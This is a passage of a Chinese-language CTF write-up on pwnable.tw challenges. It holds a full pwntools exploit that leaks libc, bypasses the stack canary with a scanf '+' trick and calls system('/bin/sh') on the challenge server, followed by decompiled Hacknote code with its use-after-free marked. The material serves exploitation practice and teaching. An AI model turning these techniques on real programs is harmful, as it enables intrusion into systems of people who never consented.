  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">!=</span> v11 <span class="token punctuation">)</span>
    <span class="token function">exit_0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br></div></div><p>虽然上面分析了不少，有些发现其实没什么用。开头的<code>name</code>能利用回显得到<code>libc</code>地址，然后输入的数字不限，而<code>buf</code>是存在栈上的可以进行溢出，可惜没办法泄露<code>canary</code>。</p> <p>后面，我本以为没有办法利用了，发现他给的<code>sort</code>冒泡排序的函数有用了。能够通过栈，将<code>canary</code>也一并排序了，这样通过冒泡可以覆盖。</p> <div class="custom-block danger"><p class="custom-block-title">偏移</p> <p>由于计算过后的长度，其实需要再除去数组的长度,这样得到的，才是正确的偏移</p></div> <p>后面通过参考<code>canary</code>的利用的时候，还发现了<code>scanf()</code>的利用。</p> <div class="custom-block warning"><p class="custom-block-title">手法</p> <p>如果没有清除缓冲区的函数的话，<code>scanf()</code>可以输入**’+/-‘**这样的非法字符，但能够存储在栈上。并且能够绕过<code>canary</code>保护</p></div> <h4 id="exp-5"><a href="#exp-5" class="header-anchor">#</a> exp</h4> <details class="custom-block details"><summary>exp</summary> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#! /usr/bin/env python</span>
<span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token comment"># vim:fenc=utf-8</span>
<span class="token comment">#</span>
<span class="token comment"># Distributed under terms of the MIT license.</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> 

pie  <span class="token operator">=</span> <span class="token number">1</span>
arch <span class="token operator">=</span> <span class="token number">32</span>
bps  <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x00000Aa2</span><span class="token punctuation">,</span><span class="token number">0x00000A48</span><span class="token punctuation">,</span><span class="token number">0x00000AB3</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">input</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;number : &quot;</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">&quot;What your name :&quot;</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">b'Sh4oBa1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">b'\x41'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    ru<span class="token punctuation">(</span><span class="token string">&quot;Sh4oBa1&quot;</span><span class="token operator">+</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x11</span><span class="token punctuation">)</span>
    
    libc_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>re<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0xa</span> <span class="token operator">-</span> <span class="token number">0x001af000</span>
    slog<span class="token punctuation">[</span><span class="token string">'libc_addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> libc_addr
    system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    slog<span class="token punctuation">[</span><span class="token string">'system_addr'</span><span class="token punctuation">]</span> <span class="token operator">=</span> system_addr
    bin_sh <span class="token operator">=</span> libc_addr <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    slog<span class="token punctuation">[</span><span class="token string">'bin_sh'</span><span class="token punctuation">]</span> <span class="token operator">=</span> bin_sh

    gdba<span class="token punctuation">(</span><span class="token punctuation">)</span>


    sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>
    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">)</span>

    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">)</span>



context<span class="token punctuation">.</span>os<span class="token operator">=</span><span class="token string">'linux'</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>

slog <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span> <span class="token punctuation">:</span> <span class="token number">111</span><span class="token punctuation">}</span>
local <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">64</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
<span class="token keyword">if</span> arch<span class="token operator">==</span><span class="token number">32</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'i386'</span>

<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bin'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;chall.pwnable.tw&quot;</span> <span class="token punctuation">,</span><span class="token number">10101</span><span class="token punctuation">)</span>

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bin'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/glibc/2.23/32/lib/libc-2.23.so'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gdba</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> local <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    cmd <span class="token operator">=</span><span class="token string">'set follow-fork-mode parent\n'</span>
    <span class="token comment">#cmd=''</span>
    <span class="token keyword">if</span> pie<span class="token punctuation">:</span>
        base <span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">&quot;pmap {}|grep bin |awk '{{print $1}}'&quot;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>pid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
        cmd <span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *{:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token operator">+</span>base<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
        cmd <span class="token operator">+=</span><span class="token string">'set $base={:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>
        slog<span class="token punctuation">[</span><span class="token string">'base'</span><span class="token punctuation">]</span> <span class="token operator">=</span> base	
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        cmd<span class="token operator">+=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'b *{:#x}\n'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> bps<span class="token punctuation">]</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>cmd<span class="token punctuation">)</span>

re  <span class="token operator">=</span> <span class="token keyword">lambda</span> m<span class="token punctuation">,</span> t <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>m<span class="token punctuation">,</span> timeout<span class="token operator">=</span>t<span class="token punctuation">)</span>
recv<span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
sd  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span> <span class="token keyword">lambda</span> x    <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ia  <span class="token operator">=</span> <span class="token keyword">lambda</span>      <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
sa  <span class="token operator">=</span> <span class="token keyword">lambda</span> a<span class="token punctuation">,</span> b <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>
<span class="token comment"># after a, send b;</span>

<span class="token keyword">def</span> <span class="token function">slog_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> slog<span class="token punctuation">:</span>
        success<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token string">' ==&gt; '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>slog<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">blast</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>

        exp<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
            io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>
        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

slog_show<span class="token punctuation">(</span><span class="token punctuation">)</span>

ia<span class="token punctuation">(</span><span class="token punctuation">)</span>


</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br><span class="line-number">68</span><br><span class="line-number">69</span><br><span class="line-number">70</span><br><span class="line-number">71</span><br><span class="line-number">72</span><br><span class="line-number">73</span><br><span class="line-number">74</span><br><span class="line-number">75</span><br><span class="line-number">76</span><br><span class="line-number">77</span><br><span class="line-number">78</span><br><span class="line-number">79</span><br><span class="line-number">80</span><br><span class="line-number">81</span><br><span class="line-number">82</span><br><span class="line-number">83</span><br><span class="line-number">84</span><br><span class="line-number">85</span><br><span class="line-number">86</span><br><span class="line-number">87</span><br><span class="line-number">88</span><br><span class="line-number">89</span><br><span class="line-number">90</span><br><span class="line-number">91</span><br><span class="line-number">92</span><br><span class="line-number">93</span><br><span class="line-number">94</span><br><span class="line-number">95</span><br><span class="line-number">96</span><br><span class="line-number">97</span><br><span class="line-number">98</span><br><span class="line-number">99</span><br><span class="line-number">100</span><br><span class="line-number">101</span><br><span class="line-number">102</span><br><span class="line-number">103</span><br><span class="line-number">104</span><br><span class="line-number">105</span><br><span class="line-number">106</span><br><span class="line-number">107</span><br><span class="line-number">108</span><br><span class="line-number">109</span><br><span class="line-number">110</span><br><span class="line-number">111</span><br></div></div></details> <h2 id="hacknote"><a href="#hacknote" class="header-anchor">#</a> Hacknote</h2> <h4 id="分析-6"><a href="#分析-6" class="header-anchor">#</a> 分析</h4> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/mnt/f/pwnable.tw/hacknote/hacknote'</span>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br></div></div><p>没开PIE，可以利用基地址而且能修改<code>got</code>表</p> <p>new_chunk，没有限制大小</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// ebx</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-1Ch]</span>
  <span class="token keyword">int</span> size<span class="token punctuation">;</span> <span class="token comment">// [esp+10h] [ebp-18h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+14h] [ebp-14h] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-Ch]</span>

  v5 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> chunk_list <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token punctuation">)</span>                        <span class="token comment">// 5个chunk</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>                  <span class="token comment">// 5个chunk头</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunk <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunk <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">// 先malloc堆块的chunk头</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunk <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Alloca Error&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunk <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> sub_804862B<span class="token punctuation">;</span>           <span class="token comment">// 调用puts</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Note size :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        size <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
        v0 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunk <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">*</span><span class="token punctuation">(</span>v0 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunk <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Alloca Error&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Content :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chunk <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Success !&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token operator">++</span>chunk_list<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Full&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v5<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br></div></div><p>漏洞点</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">unsigned</span> <span class="token keyword">int</span> __cdecl <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [esp+4h] [ebp-14h]</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+8h] [ebp-10h] BYREF</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-Ch]</span>

  v3 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">&quot;Index :&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v1 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> v1 <span class="token operator">&gt;=</span> chunk_list <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Out of bound!&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">_exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> chunk<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span>                              <span class="token comment">// 这里防止double_free</span>
  <span class="token punctuation">{</span>
    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>chunk<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>chunk<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment">// uaf</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">&quot;Success&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
